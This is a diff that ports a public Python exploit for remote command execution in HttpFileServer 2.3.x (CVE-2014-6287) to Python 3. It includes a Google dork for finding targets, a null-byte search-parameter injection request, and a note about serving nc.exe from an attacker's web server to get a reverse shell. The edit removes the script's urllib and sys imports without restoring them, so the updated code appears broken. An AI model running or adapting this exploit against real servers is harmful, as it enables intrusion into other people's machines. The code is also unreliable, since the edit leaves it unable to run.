@@ -1,39 +1,42 @@
-#!/usr/bin/env python3
-# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
-# Google Dork: intext:"httpfileserver 2.3"
-# Date: 04-01-2016
-# Remote: Yes
-# Exploit Author: Avinash Kumar Thapa aka "-Acid"
-# Vendor Homepage: http://rejetto.com/
-# Software Link: http://sourceforge.net/projects/hfs/
-# Version: 2.3.x
+#!/usr/bin/env python3           
+
+# Updated to Python3 by WatIsYourPasswd
+
+# Exploit Title: HttpFileServer 2.3.x Remote Command Execution                                                     
+# Google Dork: intext:"httpfileserver 2.3"                                                                         
+# Date: 04-01-2016                                                                                                 
+# Remote: Yes                                                                                                      
+# Exploit Author: Avinash Kumar Thapa aka "-Acid"                                                                  
+# Vendor Homepage: http://rejetto.com/                                                                             
+# Software Link: http://sourceforge.net/projects/hfs/                                                              
+# Version: 2.3.x                                                                                                   
 
 # Tested on: Windows Server 2008 , Windows 8, Windows 7
 # CVE : CVE-2014-6287
 # Description: You can use HFS (HTTP File Server) to send and receive files.
 #              It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
 #              It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
- 
+  
+
 #Usage : python Exploit.py <Target IP address> <Target Port Number> <Local IP address> <Local Port Number>
 
 #EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
 #          You may need to run it multiple times for success!
 
 
-import urllib.request, urllib.error, urllib.parse
-import sys
 
-if len(sys.argv) != 5:
-    print("usage: %s <host> <port> <Lhost> <Lport>" % sys.argv[0])
-    return
+def main():
+    try:
 
-host = sys.argv[1]
-port = sys.argv[2]
-lhost = sys.argv[3]
-lport = sys.argv[4]
+        if len(sys.argv) != 5:
+            print("usage: %s <Remote host> <Remote port> <Local host> <Local port>" % sys.argv[0])
+            print("Also, don't forget to host nc.exe on a webserver on port 80, and run this multiple times")
+            return
 
-
-try:
+        host = sys.argv[1]
+        port = sys.argv[2]
+        lhost = sys.argv[3]
+        lport = sys.argv[4]
 
         def script_create():
                 urllib.request.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")
@@ -55,6 +58,7 @@ try:
         script_create()
         execute_script()
         nc_run()
-except:
-        print("""[.]Something went wrong..!
-    Usage is :[.] python3 exploit.py <Target IP address>  <Target Port Number> <Local IP Address> <Local Port Number>""")
+    except:
+        print("[.]Something went wrong..!")
+if __name__ == '__main__':
+        main()
